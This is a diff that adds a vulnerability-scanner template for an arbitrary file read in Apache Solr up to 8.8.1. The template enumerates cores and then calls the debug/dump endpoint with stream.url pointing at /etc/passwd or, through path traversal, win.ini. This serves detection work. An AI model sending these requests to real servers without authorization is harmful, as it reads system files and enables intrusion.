@@ -1,0 +1,36 @@
+id: solr-debug-dump-fileread
+
+info:
+  name: Apache Solr <= 8.8.1 Arbitrary File Read
+  author: DhiyaneshDk
+  severity: high
+  verified: false
+  description: |
+    Apache Solr <= 8.8.1 Arbitrary File Read
+  reference:
+    - https://twitter.com/Al1ex4/status/1382981479727128580
+    - https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
+    - https://twitter.com/sec715/status/1373472323538362371
+  tags: solr,fileread,unauthorized
+  created: 2023/05/26
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /solr/admin/cores?wt=json
+    expression: response.status == 200 && response.body.ibcontains(b'"responseHeader":')
+    output:
+      search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
+      core: search["core"]
+  r1:
+    request:
+      method: GET
+      path: /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream
+    expression: '"root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)'
+  r2:
+    request:
+      method: GET
+      path: /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream
+    expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
+expression: r0() && (r1() || r2())
